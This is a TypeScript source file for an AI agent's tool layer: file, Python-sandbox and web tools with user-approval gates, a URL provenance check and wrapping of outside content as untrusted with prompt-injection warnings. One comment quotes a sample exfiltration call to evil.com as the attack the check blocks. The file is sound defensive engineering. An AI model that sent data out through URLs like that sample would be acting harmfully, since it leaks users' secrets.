/**
 * The agent's tools. Specs (what the model sees) + one executor.
 *
 * Runs in the browser tab (and in Node for evals). File tools act on the
 * Workspace; run_python uses the sandbox on a COPY of the folder; web and
 * document tools go to the server. Every gate (approval, URL provenance,
 * path checks) is enforced HERE, in code — never left to the model.
 */
import type { AgentEvent, LlmReply, ChatMessage, Todo, ToolSpec } from "./types";
import type { PythonSandbox } from "./sandbox";
import { diffFiles } from "./sandbox";
import { normalizePath, snapshot, type Workspace } from "./workspace";
import { extractUrls, looksLikeInjection, wrapUntrusted } from "./safety";

export interface AgentDeps {
  llm(messages: ChatMessage[], tools?: ToolSpec[], opts?: { light?: boolean; maxTokens?: number }): Promise<LlmReply>;
  serverTool(name: "web_search" | "read_webpage" | "search_docs", args: Record<string, unknown>): Promise<{ result?: any; error?: string }>;
  workspace: Workspace;
  python: PythonSandbox;
  /** Show an approval card; resolves true (approved) or false (denied). */
  approve(question: string): Promise<boolean>;
  askUser(question: string): Promise<string>;
  emit(e: AgentEvent): void;
  shouldStop(): boolean;
  pythonTimeoutMs?: number;
}

/** State shared by the main agent and its sub-agents during one task. */
export interface RunState {
  todos: Todo[];
  /** URLs the agent may open: from the goal, search results and pages already read */
  seenUrls: Set<string>;
  /** files this task created or changed */
  touched: Set<string>;
}

const TEXT_EXT = /\.(txt|md|markdown|csv|tsv|json|jsonl|py|js|ts|html|htm|xml|yaml|yml|log|ini|toml|sql)$/i;
const MAX_READ_CHARS = 12_000;

const obj = (properties: Record<string, unknown>, required: string[] = []) => ({ type: "object", properties, required });
const str = (description: string) => ({ type: "string", description });

export const SPECS: Record<string, ToolSpec> = {
  update_todos: {
    name: "update_todos",
    description:
      "Set your to-do list for this task (replaces the old list). Call it FIRST with your plan, then again whenever an item starts, finishes, fails, or the plan changes.",
    parameters: obj(
      {
        items: {
          type: "array",
          items: obj({ text: str("short action"), status: { type: "string", enum: ["todo", "doing", "done", "failed"] } }, ["text", "status"]),
        },
      },
      ["items"]
    ),
  },
  list_files: {
    name: "list_files",
    description: "List every file in the user's folder with its size.",
    parameters: obj({}),
  },
  read_file: {
    name: "read_file",
    description: `Read a TEXT file (csv, md, txt, json…) from the folder, first ${MAX_READ_CHARS} characters. For PDF, Excel, Word or PowerPoint files use run_python (pypdf, openpyxl/pandas, python-docx, python-pptx).`,
    parameters: obj({ path: str("path relative to the folder") }, ["path"]),
  },
  write_file: {
    name: "write_file",
    description: "Write a TEXT file into the folder. Overwriting an existing file asks the user first — prefer a new file name.",
    parameters: obj({ path: str("path relative to the folder"), content: str("full file content") }, ["path", "content"]),
  },
  rename: {
    name: "rename",
    description: "Move or rename a file inside the folder (also used to organise files into subfolders).",
    parameters: obj({ from: str("current path"), to: str("new path") }, ["from", "to"]),
  },
  delete: {
    name: "delete",
    description: "Delete a file. Always asks the user first. Avoid unless the goal requires it.",
    parameters: obj({ path: str("path to delete") }, ["path"]),
  },
  run_python: {
    name: "run_python",
    description:
      "Run Python 3 (Pyodide) with the folder as the current directory. Available: pandas, numpy, matplotlib (save charts with plt.savefig), openpyxl (Excel, formulas as strings like '=SUM(B2:B9)'), python-pptx, python-docx, pypdf. No internet. New files you save appear in the user's folder; changing or deleting EXISTING files asks the user. Print what you need to see. 60 s limit per run.",
    parameters: obj({ code: str("Python code") }, ["code"]),
  },
  web_search: {
    name: "web_search",
    description: "Search the web. Returns titles, URLs and snippets.",
    parameters: obj({ query: str("search query") }, ["query"]),
  },
  read_webpage: {
    name: "read_webpage",
    description: "Read the main text of a web page. Only URLs that came from the user's goal, a web_search result or a page you already read are allowed.",
    parameters: obj({ url: str("full https URL") }, ["url"]),
  },
  search_docs: {
    name: "search_docs",
    description: "Semantic search over the documents the user uploaded to Cortexa (their knowledge base, not this folder).",
    parameters: obj({ query: str("what to look for") }, ["query"]),
  },
  research_parallel: {
    name: "research_parallel",
    description:
      "Research up to 3 separate questions AT THE SAME TIME with helper agents (each can search the web, read pages and search the user's documents). Returns their notes with sources. Use for research tasks with several sub-topics.",
    parameters: obj({ questions: { type: "array", items: { type: "string" }, maxItems: 3 } }, ["questions"]),
  },
  ask_user: {
    name: "ask_user",
    description: "Ask the user a question when the goal is truly ambiguous and a wrong guess would waste the work. Don't ask for things you can find out yourself.",
    parameters: obj({ question: str("one clear question") }, ["question"]),
  },
  finish: {
    name: "finish",
    description: "Call when the goal is done. List the output files you created. The files will be opened and checked against the goal before the task is accepted.",
    parameters: obj({ summary: str("what you did, 2-4 sentences"), outputs: { type: "array", items: { type: "string" } } }, ["summary", "outputs"]),
  },
};

export const MAIN_TOOLS = Object.keys(SPECS);
export const RESEARCH_TOOLS = ["web_search", "read_webpage", "search_docs"];

const dec = new TextDecoder();
const enc = new TextEncoder();

function cleanUrl(u: string): string {
  try {
    const url = new URL(u);
    url.hash = "";
    return url.toString().replace(/\/$/, "");
  } catch {
    return u;
  }
}

export function rememberUrls(state: RunState, text: string) {
  for (const u of extractUrls(text, 80)) state.seenUrls.add(cleanUrl(u));
}

/** URL provenance: blocks "fetch https://evil.com/?data=<secret>" style exfiltration. */
export function urlAllowed(state: RunState, url: string): boolean {
  return state.seenUrls.has(cleanUrl(url));
}

export interface ToolOutcome {
  /** what goes back to the model */
  content: string;
  ok: boolean;
  /** what the timeline shows */
  summary: string;
  detail?: string;
  sources?: string[];
  files?: string[];
}

const fail = (summary: string): ToolOutcome => ({ ok: false, summary, content: JSON.stringify({ error: summary }) });

/** Wrap anything that came from outside (files, web, docs) and flag likely injections. */
function untrusted(deps: AgentDeps, source: string, text: string): string {
  const hit = looksLikeInjection(text);
  if (hit) deps.emit({ type: "warning", text: `Possible prompt injection in ${source} ("${hit.slice(0, 60)}") — treated as data, not instructions.` });
  return wrapUntrusted(source, text);
}

export async function runTool(name: string, args: Record<string, any>, deps: AgentDeps, state: RunState): Promise<ToolOutcome> {
  const ws = deps.workspace;
  switch (name) {
    case "update_todos": {
      const items = Array.isArray(args.items) ? args.items : [];
      state.todos = items.slice(0, 12).map((t: any, i: number) => ({
        id: i + 1,
        text: String(t?.text ?? "").slice(0, 160),
        status: ["todo", "doing", "done", "failed"].includes(t?.status) ? t.status : "todo",
      }));
      deps.emit({ type: "todos", todos: state.todos });
      return { ok: true, summary: `${state.todos.length} to-dos`, content: JSON.stringify({ ok: true }) };
    }

    case "list_files": {
      const files = await ws.list();
      return {
        ok: true,
        summary: `${files.length} files`,
        content: JSON.stringify({ files: files.map((f) => `${f.path} (${f.size} B)`) }),
      };
    }

    case "read_file": {
      const path = normalizePath(args.path);
      const data = await ws.read(path);
      if (!data) return fail(`No such file: ${path}`);
      if (!TEXT_EXT.test(path))
        return {
          ok: true,
          summary: `${path} is binary`,
          content: JSON.stringify({ note: `${path} is a binary file (${data.length} bytes). Open it with run_python.` }),
        };
      const text = dec.decode(data);
      return {
        ok: true,
        summary: `read ${path} (${text.length} chars)`,
        content: untrusted(deps, `file:${path}`, text.slice(0, MAX_READ_CHARS) + (text.length > MAX_READ_CHARS ? "\n…[truncated]" : "")),
      };
    }

    case "write_file": {
      const path = normalizePath(args.path);
      const content = String(args.content ?? "");
      if (await ws.exists(path)) {
        if (!(await deps.approve(`Overwrite the existing file "${path}"?`))) return fail(`User did not allow overwriting ${path}. Write to a new file name instead.`);
      }
      await ws.write(path, enc.encode(content));
      state.touched.add(path);
      return { ok: true, summary: `wrote ${path}`, files: [path], content: JSON.stringify({ written: path, chars: content.length }) };
    }

    case "rename": {
      const from = normalizePath(args.from);
      const to = normalizePath(args.to);
      if (!(await ws.exists(from))) return fail(`No such file: ${from}`);
      if (await ws.exists(to)) {
        if (!(await deps.approve(`"${to}" already exists. Replace it with "${from}"?`))) return fail(`User did not allow replacing ${to}.`);
      }
      await ws.rename(from, to);
      state.touched.add(to);
      return { ok: true, summary: `${from} → ${to}`, files: [to], content: JSON.stringify({ moved: { from, to } }) };
    }

    case "delete": {
      const path = normalizePath(args.path);
      if (!(await ws.exists(path))) return fail(`No such file: ${path}`);
      if (!(await deps.approve(`Delete "${path}"? This can't be undone.`))) return fail(`User did not allow deleting ${path}.`);
      await ws.remove(path);
      return { ok: true, summary: `deleted ${path}`, content: JSON.stringify({ deleted: path }) };
    }

    case "run_python":
      return runPython(String(args.code ?? ""), deps, state);

    case "web_search": {
      const r = await deps.serverTool("web_search", { query: String(args.query ?? "") });
      if (r.error) return fail(r.error);
      const text = String(r.result?.results ?? "");
      rememberUrls(state, text);
      const sources = extractUrls(text, 8);
      return { ok: true, summary: `${sources.length} results`, sources, content: untrusted(deps, "web_search", text) };
    }

    case "read_webpage": {
      const url = String(args.url ?? "");
      if (!urlAllowed(state, url))
        return fail("Blocked: this URL did not come from the goal, a search result or a page you read. Search for it first.");
      const r = await deps.serverTool("read_webpage", { url });
      if (r.error) return fail(r.error);
      const page = r.result as { title: string; text: string; links: string[] };
      for (const l of page.links ?? []) state.seenUrls.add(cleanUrl(l));
      return {
        ok: true,
        summary: page.title,
        sources: [url],
        content: untrusted(deps, `webpage:${url}`, `TITLE: ${page.title}\nURL: ${url}\n\n${page.text}`),
      };
    }

    case "search_docs": {
      const r = await deps.serverTool("search_docs", { query: String(args.query ?? "") });
      if (r.error) return fail(r.error);
      const results = r.result?.results ?? [];
      return { ok: true, summary: `${results.length} passages`, content: untrusted(deps, "cortexa_documents", JSON.stringify(results)) };
    }

    case "ask_user": {
      const answer = await deps.askUser(String(args.question ?? ""));
      return { ok: true, summary: "answered", content: JSON.stringify({ answer }) };
    }
  }
  return fail(`Unknown tool: ${name}`);
}

async function runPython(code: string, deps: AgentDeps, state: RunState): Promise<ToolOutcome> {
  if (!code.trim()) return fail("code is empty");
  const { files: before, skipped } = await snapshot(deps.workspace);
  const r = await deps.python.run(code, before, {
    timeoutMs: deps.pythonTimeoutMs,
    onStatus: (text) => deps.emit({ type: "status", text }),
  });

  const saved: string[] = [];
  const notes: string[] = [];
  if (r.ok || Object.keys(r.files).length) {
    const changes = r.timedOut ? { created: [], modified: [], deleted: [] } : diffFiles(before, r.files);
    // new files: always fine — they can't destroy anything
    for (const p of changes.created) {
      await deps.workspace.write(p, r.files[p]);
      state.touched.add(p);
      saved.push(p);
    }
    // changing or deleting existing files: the user decides
    const risky = [...changes.modified.map((p) => `change ${p}`), ...changes.deleted.map((p) => `delete ${p}`)];
    if (risky.length) {
      const ok = await deps.approve(`Python wants to ${risky.join(", ")}. Allow?`);
      if (ok) {
        for (const p of changes.modified) {
          await deps.workspace.write(p, r.files[p]);
          state.touched.add(p);
          saved.push(p);
        }
        for (const p of changes.deleted) await deps.workspace.remove(p);
      } else notes.push(`User did NOT allow: ${risky.join(", ")}. Those changes were discarded — write new files instead.`);
    }
  }
  if (skipped.length) notes.push(`Too large to copy into Python, not available: ${skipped.join(", ")}`);

  const out = [r.stdout && `STDOUT:\n${r.stdout.slice(-6000)}`, r.stderr && `STDERR:\n${r.stderr.slice(-1500)}`, r.result && `RESULT: ${r.result}`, r.error && `ERROR:\n${r.error}`]
    .filter(Boolean)
    .join("\n");
  return {
    ok: r.ok,
    summary: r.ok ? (saved.length ? `saved ${saved.join(", ")}` : "ran") : r.timedOut ? "timed out" : "error",
    detail: out || "(no output)",
    files: saved,
    // printed output can contain file text, so it is untrusted too
    content: untrusted(deps, "run_python output", JSON.stringify({ ok: r.ok, saved_files: saved, notes, output: (out || "(no output)").slice(-8000) })),
  };
}
